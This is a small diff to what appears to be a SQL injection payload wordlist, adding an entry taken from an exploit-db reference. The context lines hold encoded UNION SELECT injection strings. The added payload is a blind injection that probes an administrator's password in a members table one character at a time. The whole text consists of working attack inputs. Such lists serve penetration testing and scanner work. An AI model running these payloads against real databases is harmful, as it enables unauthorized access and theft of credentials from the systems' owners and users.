@@ -622,3 +622,8 @@ ANY((SELECT 1)) - 1 UNION ALL --
 #
 1%A0UNION%A0SELECT%A02--
 1%00UNION%00SELECT%002--
+
+#
+# http://www.exploit-db.com/exploits/28854/
+#
+stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
